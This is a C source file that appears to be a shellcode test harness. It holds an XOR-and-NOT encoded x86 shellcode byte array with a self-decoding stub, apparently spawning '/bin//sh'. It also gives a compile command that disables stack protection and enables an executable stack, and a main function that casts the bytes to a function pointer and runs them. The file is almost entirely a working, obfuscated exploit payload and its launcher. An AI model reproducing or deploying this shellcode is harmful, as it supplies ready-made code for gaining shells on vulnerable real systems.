#include <stdio.h>
#include <string.h>

/*
To compile:
gcc -m32 -fno-stack-protector -z execstack sc_test.c -o sc_test
*/

unsigned char shellcode[] = \ 
    "\xeb\x0e\x5e\x80\x3e\x7c\x74\x0d"
    "\x80\x36\xe4\xf6\x16\x46\xeb\xf3"
    "\xe8\xed\xff\xff\xff\x2a\xdb\x4b"
    "\x73\x34\x34\x68\x73\x73\x34\x79"
    "\x72\x75\x92\xf8\x4b\x92\xf9\x48"
    "\x92\xfa\xab\x10\xd6\x9b\x7c";

int main(void)
{
    printf("Shellcode Length: %d\n", strlen(shellcode));
    int (*ret)() = (int(*)())shellcode;
    ret();
}
